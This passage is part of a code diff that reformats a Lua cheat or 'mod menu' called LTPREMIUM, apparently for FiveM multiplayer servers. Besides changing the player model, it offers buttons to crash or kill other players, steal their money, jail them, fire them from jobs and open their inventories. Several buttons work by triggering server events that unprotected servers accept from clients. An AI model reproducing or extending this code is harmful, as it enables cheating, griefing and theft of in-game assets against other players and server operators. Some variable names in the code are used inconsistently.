-	SetPedDefaultComponentVariation(GetPlayerPed(-1))
-    SetModelAsNoLongerNeeded(model3)
-	elseif LTPREMIUM.Button("Change To ~y~Trevor") then
-			Deer.Destroy()
-		Wait(100)
-				local model13 = GetHashKey("player_two")
-				local player1 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model13)
-    while not HasModelLoaded(model13) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player1, model13)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model1)
-	elseif LTPREMIUM.Button("Change To ~b~Michael") then
-			Deer.Destroy()
-		Wait(100)
-				local model12 = GetHashKey("player_zero")
-				local player1 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model12)
-    while not HasModelLoaded(model12) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player1, model12)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model12)
-	elseif LTPREMIUM.Button("Change To ~g~Franklin") then
-			Deer.Destroy()
-		Wait(100)
-				local model11 = GetHashKey("player_one")
-				local player1 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model11)
-    while not HasModelLoaded(model11) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player1, model11)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model11)
-	elseif LTPREMIUM.Button("Change To ~r~Alien") then
-			Deer.Destroy()
-		Wait(100)
-				local model121 = GetHashKey("s_m_m_movalien_01")
-				local player1 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model121)
-    while not HasModelLoaded(model121) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player1, model121)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model121)
-	elseif LTPREMIUM.Button("Change To ~h~Bigfoot") then
-			Deer.Destroy()
-		Wait(100)
-				local model122 = GetHashKey("ig_orleans")
-				local player1 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model122)
-    while not HasModelLoaded(model122) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player1, model122)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model122)
-	elseif LTPREMIUM.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
-    TriggerEvent('esx_skin:openSaveableMenu')
-	end
-	LTPREMIUM.Display()
-            elseif LTPREMIUM.IsMenuOpened("OnlinePlayersMenu") then
-                    for i = 0, 128 do
-                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LTPREMIUM.MenuButton("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
-                            SelectedPlayer = i
-                        end
+                    RequestModel(model1)
+                    while not HasModelLoaded(model1) do
+                        Wait(100)
                     end
 
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("PlayerOptionsMenu") then
-                    LTPREMIUM.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
-                    if LTPREMIUM.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
-                        SpectatePlayer(SelectedPlayer)
-					elseif LTPREMIUM.Button('~g~Heal ~s~Player') then
+                    SetPlayerModel(player1, model1)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model1)
+                elseif LTPREMIUM.Button("Change To Selected ~p~Female") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model5 = GetHashKey(peds3[selectedPeddd])
+                    local player5 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model5)
+                    while not HasModelLoaded(model5) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player5, model5)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model5)
+                elseif LTPREMIUM.Button("Change To Selected ~y~Animal") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model6 = GetHashKey(peds4[selectedPedddd])
+                    local player6 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model6)
+                    while not HasModelLoaded(model6) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player6, model6)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model6)
+                elseif LTPREMIUM.Button("Spawn A ~y~Deer ~s~And Ride It") then
+                    Deer.Create()
+                    Citizen.Wait(150)
+                    Deer.Ride()
+                elseif LTPREMIUM.Button("Change To FiveM Ped") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model3 = GetHashKey("mp_m_freemode_01")
+                    local player3 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+                    RequestModel(model3)
+                    while not HasModelLoaded(model3) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player3, model3)
+                    SetPedDefaultComponentVariation(GetPlayerPed(-1))
+                    SetModelAsNoLongerNeeded(model3)
+                elseif LTPREMIUM.Button("Change To ~y~Trevor") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model13 = GetHashKey("player_two")
+                    local player1 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model13)
+                    while not HasModelLoaded(model13) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player1, model13)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model1)
+                elseif LTPREMIUM.Button("Change To ~b~Michael") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model12 = GetHashKey("player_zero")
+                    local player1 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model12)
+                    while not HasModelLoaded(model12) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player1, model12)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model12)
+                elseif LTPREMIUM.Button("Change To ~g~Franklin") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model11 = GetHashKey("player_one")
+                    local player1 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model11)
+                    while not HasModelLoaded(model11) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player1, model11)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model11)
+                elseif LTPREMIUM.Button("Change To ~r~Alien") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model121 = GetHashKey("s_m_m_movalien_01")
+                    local player1 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model121)
+                    while not HasModelLoaded(model121) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player1, model121)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model121)
+                elseif LTPREMIUM.Button("Change To ~h~Bigfoot") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model122 = GetHashKey("ig_orleans")
+                    local player1 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+
+                    RequestModel(model122)
+                    while not HasModelLoaded(model122) do
+                        Wait(100)
+                    end
+
+                    SetPlayerModel(player1, model122)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model122)
+                elseif LTPREMIUM.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
+                    TriggerEvent('esx_skin:openSaveableMenu')
+                end
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("OnlinePlayersMenu") then
+                for i = 0, 128 do
+                    if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LTPREMIUM.MenuButton("~r~→  ~s~Name: " .. GetPlayerName(i) .. " | ID: " .. GetPlayerServerId(i) .. " | " .. (IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
+                        SelectedPlayer = i
+                    end
+                end
+
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("PlayerOptionsMenu") then
+                LTPREMIUM.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")
+                if LTPREMIUM.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
+                    SpectatePlayer(SelectedPlayer)
+                elseif LTPREMIUM.Button('~g~Heal ~s~Player') then
                     local dU = 'PICKUP_HEALTH_STANDARD'
                     local dV = GetHashKey(dU)
                     local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
@@ -7529,12 +7990,14 @@ for i, dA in pairs(bd) do
                         i = i + 1
                     end
                 elseif LTPREMIUM.Button("~w~[QB] [ESX]Open ~b~Inventory") then
-                    TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
-					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
-					elseif LTPREMIUM.Button("Teleport To Player With Vehicle") then
-										drawNotification(
-                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
-                        )
+                    TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", GetPlayerServerId(selectedPlayer),
+                        GetPlayerName(selectedPlayer))
+                    TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer),
+                        GetPlayerName(selectedPlayer))
+                elseif LTPREMIUM.Button("Teleport To Player With Vehicle") then
+                    drawNotification(
+                        'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
+                    )
                     local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                     if cP == 'y' then
                         local Entity =
@@ -7553,10 +8016,10 @@ for i, dA in pairs(bd) do
                             '~h~~r~Operation cancelled~s~.'
                         )
                     end
-                    elseif LTPREMIUM.Button("Teleport To Player") then
-										drawNotification(
-                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
-                        )
+                elseif LTPREMIUM.Button("Teleport To Player") then
+                    drawNotification(
+                        'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
+                    )
                     local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                     if cP == 'y' then
                         local Entity =
@@ -7575,162 +8038,173 @@ for i, dA in pairs(bd) do
                             '~h~~r~Operation cancelled~s~.'
                         )
                     end
-					elseif LTPREMIUM.Button("~g~Give ~w~Money") then
-						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
-						if result then
-						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
-						end
-                    elseif LTPREMIUM.Button("Crash Player") then
-                        CrashPlayer(GetPlayerPed(SelectedPlayer))
-                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then
-                    elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Options", "PlayerESXMenu") then
-                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
-                    elseif LTPREMIUM.Button("Give Ammo") then
-                        for i = 1, #allWeapons do
-                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
-                        end
-                    elseif LTPREMIUM.Button("Give All Weapons") then
-                        for i = 1, #allWeapons do
-                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
-                        end
-                    elseif LTPREMIUM.Button("Remove All Weapons") then
-                        for i = 1, #allWeapons do
-                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
-                        end
-                    elseif LTPREMIUM.Button("Give Vehicle") then
-                        local ped = GetPlayerPed(SelectedPlayer)
-                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
+                elseif LTPREMIUM.Button("~g~Give ~w~Money") then
+                    local result = KeyboardInput("Enter amount of money to give", "", 100000000)
+                    if result then
+                        TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money",
+                            "money", result)
+                    end
+                elseif LTPREMIUM.Button("Crash Player") then
+                    CrashPlayer(GetPlayerPed(SelectedPlayer))
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Options", "PlayerESXMenu") then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
+                elseif LTPREMIUM.Button("Give Ammo") then
+                    for i = 1, #allWeapons do
+                        AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
+                    end
+                elseif LTPREMIUM.Button("Give All Weapons") then
+                    for i = 1, #allWeapons do
+                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
+                    end
+                elseif LTPREMIUM.Button("Remove All Weapons") then
+                    for i = 1, #allWeapons do
+                        RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
+                    end
+                elseif LTPREMIUM.Button("Give Vehicle") then
+                    local ped = GetPlayerPed(SelectedPlayer)
+                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
 
-                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
-                            RequestModel(ModelName)
-                            while not HasModelLoaded(ModelName) do
-                                Citizen.Wait(-1000)
-                            end
-
-                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
-                            drawNotification("~g~Vehicle Given To Player!")
-                        else
-                            drawNotification("~r~Model is not valid!")
+                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
+                        RequestModel(ModelName)
+                        while not HasModelLoaded(ModelName) do
+                            Citizen.Wait(-1000)
                         end
-					elseif LTPREMIUM.Button('Clone Car') then
+
+                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped),
+                            true, true)
+                        drawNotification("~g~Vehicle Given To Player!")
+                    else
+                        drawNotification("~r~Model is not valid!")
+                    end
+                elseif LTPREMIUM.Button('Clone Car') then
                     ClonePedVeh()
-					elseif LTPREMIUM.Button('Spawn Following Asshat') then
+                elseif LTPREMIUM.Button('Spawn Following Asshat') then
                     Citizen.CreateThread(function()
-                    asshat = true
-                    local target = GetPlayerPed(SelectedPlayer)
-                    local assped = nil
-                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
-                    local veh = vehlist[math.random(#vehlist)]
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
-                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
-                        NetworkRequestControlOfEntity(vt)
-                        SetVehicleModKit(vt, 0)
-                        ToggleVehicleMod(vt, 20, 1)
-                        SetVehicleModKit(vt, 0)
-                        SetVehicleTyresCanBurst(vt, 1)
-                    end
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('s_m_y_hwaycop_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
-                        RequestModel('s_m_y_hwaycop_01')
-                        Citizen.Wait(-1000)
+                        asshat = true
+                        local target = GetPlayerPed(SelectedPlayer)
+                        local assped = nil
+                        local vehlist = { 'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380",
+                            "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali",
+                            "STROMBERG", "BARRAGE", "COMET5" }
+                        local veh = vehlist[math.random(#vehlist)]
+                        local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                        local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
+                        local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
+                        local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
+                        local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
+                        local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
+                        if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
+                            local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
+                            NetworkRequestControlOfEntity(vt)
+                            SetVehicleModKit(vt, 0)
+                            ToggleVehicleMod(vt, 20, 1)
+                            SetVehicleModKit(vt, 0)
+                            SetVehicleTyresCanBurst(vt, 1)
+                        end
+                        local v = nil
                         RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 10),
-                            pos.y - (yf * 10),
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(-1)),
-                            1,
-                            1
-                        )
-                        v1 =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 10) + 2,
-                            pos.y - (yf * 10) + 2,
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(-1)),
-                            1,
-                            1
-                        )
-                        SetVehicleGravityAmount(v, 15.0)
-                        SetVehicleGravityAmount(v1, 15.0)
-                        SetEntityInvincible(v, true)
-                        SetEntityInvincible(v1, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
+                        RequestModel('s_m_y_hwaycop_01')
+                        while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                             RequestModel('s_m_y_hwaycop_01')
+                            Citizen.Wait(-1000)
+                            RequestModel(veh)
+                        end
+                        if HasModelLoaded(veh) then
                             Citizen.Wait(50)
-                            if HasModelLoaded('s_m_y_hwaycop_01') then
+                            v =
+                                CreateVehicle(
+                                    veh,
+                                    pos.x - (xf * 10),
+                                    pos.y - (yf * 10),
+                                    pos.z + 1,
+                                    GetEntityHeading(GetPlayerPed(-1)),
+                                    1,
+                                    1
+                                )
+                            v1 =
+                                CreateVehicle(
+                                    veh,
+                                    pos.x - (xf * 10) + 2,
+                                    pos.y - (yf * 10) + 2,
+                                    pos.z + 1,
+                                    GetEntityHeading(GetPlayerPed(-1)),
+                                    1,
+                                    1
+                                )
+                            SetVehicleGravityAmount(v, 15.0)
+                            SetVehicleGravityAmount(v1, 15.0)
+                            SetEntityInvincible(v, true)
+                            SetEntityInvincible(v1, true)
+                            if DoesEntityExist(v) then
+                                NetworkRequestControlOfEntity(v)
+                                SetVehicleDoorsLocked(v, 4)
+                                RequestModel('s_m_y_hwaycop_01')
                                 Citizen.Wait(50)
-                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
-                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
-                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
-                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
-                                assped = ped
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
-                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
-                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
-                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v1, -1)
-                                    SetPedIntoVehicle(pas, v, 0)
-                                    SetPedIntoVehicle(pas1, v1, 0)
-                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
-                                    asstarget = target
-                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                    SetDriverAbility(ped1, 10.0)
-                                    SetDriverAggressiveness(ped1, 10.0)
+                                if HasModelLoaded('s_m_y_hwaycop_01') then
+                                    Citizen.Wait(50)
+                                    local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true,
+                                        false)
+                                    local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true,
+                                        false)
+                                    local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true,
+                                        false)
+                                    local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true,
+                                        false)
+                                    assped = ped
+                                    if DoesEntityExist(ped1) and DoesEntityExist(ped) then
+                                        GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                        GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                        GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
+                                        SetPedIntoVehicle(ped, v, -1)
+                                        SetPedIntoVehicle(ped1, v1, -1)
+                                        SetPedIntoVehicle(pas, v, 0)
+                                        SetPedIntoVehicle(pas1, v1, 0)
+                                        TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
+                                        asstarget = target
+                                        TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
+                                        SetDriverAbility(ped, 10.0)
+                                        SetDriverAggressiveness(ped, 10.0)
+                                        SetDriverAbility(ped1, 10.0)
+                                        SetDriverAggressiveness(ped1, 10.0)
+                                    end
                                 end
                             end
                         end
-                    end
-                end)
-                    elseif LTPREMIUM.Button("Kick From Vehicle") then
-                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-                        drawNotification("~g~Kicked Player From Vehicle!")
-					elseif LTPREMIUM.Button("Kill Player") then
-					SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
-					SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
-                    elseif LTPREMIUM.Button("Spawn Flare On Player") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
-                    elseif LTPREMIUM.Button("Spawn Smoke On Player") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
-                    end
+                    end)
+                elseif LTPREMIUM.Button("Kick From Vehicle") then
+                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
+                    drawNotification("~g~Kicked Player From Vehicle!")
+                elseif LTPREMIUM.Button("Kill Player") then
+                    SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
+                    SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
+                elseif LTPREMIUM.Button("Spawn Flare On Player") then
+                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true,
+                        GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
+                elseif LTPREMIUM.Button("Spawn Smoke On Player") then
+                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true,
+                        GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
+                end
 
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("PlayerESXMenu") then
-                    if LTPREMIUM.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
-                    elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
-                    end
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("PlayerESXMenu") then
+                if LTPREMIUM.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
+                end
 
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("PlayerESXTriggerMenu") then
-                    if LTPREMIUM.Button("ESX Revive") then
-					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
-                    TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
-					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
-				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
-				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
-					local ax = GetPlayerPed(SelectedPlayer)
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("PlayerESXTriggerMenu") then
+                if LTPREMIUM.Button("ESX Revive") then
+                    TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
+                    TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(selectedPlayer),
+                        GetPlayerServerId(selectedPlayer))
+                    TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
+                    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
+                    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
+                    local ax = GetPlayerPed(SelectedPlayer)
                     local bK = GetEntityCoords(ax)
                     TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                     local dZ = {
@@ -7740,83 +8214,86 @@ for i, dA in pairs(bd) do
                     }
                     StopScreenEffect('DeathFailOut')
                     DoScreenFadeIn(800)
-					elseif LTPREMIUM.Button("Fire player from job (~g~ESX~s~)") then
-				    FirePlayer(SelectedPlayer)
-                    elseif LTPREMIUM.Button("ESX Give Money To Player From Your Wallet") then
-                        local d = KeyboardInput("Enter amount of money to give","",100)
-                        if d ~= "" then
-                            TriggerServerEvent("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
-                        end
-                    elseif LTPREMIUM.Button("ESX Steal Money From Player") then
-                        local d=KeyboardInput("Enter amount of money to steal","",100)
-                        if d ~= "" then
-                            TriggerServerEvent("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
-                        end
-                    elseif LTPREMIUM.Button("ESX Handcuff Player") then
-                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
-                    elseif LTPREMIUM.Button("ESX Send To Jail") then
-                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
-                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
-                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
-                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
-                    elseif LTPREMIUM.Button("ESX Get Out Of Jail") then
-                        local ped = selectedPlayer
-                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
-                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
-                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
-                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
+                elseif LTPREMIUM.Button("Fire player from job (~g~ESX~s~)") then
+                    FirePlayer(SelectedPlayer)
+                elseif LTPREMIUM.Button("ESX Give Money To Player From Your Wallet") then
+                    local d = KeyboardInput("Enter amount of money to give", "", 100)
+                    if d ~= "" then
+                        TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(selectedPlayer), "item_money",
+                            "money", d)
                     end
-
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("PlayerESXJobMenu") then
-                    if LTPREMIUM.Button("Unemployed") then
-                        TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
-                    elseif LTPREMIUM.Button("Police") then
-                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
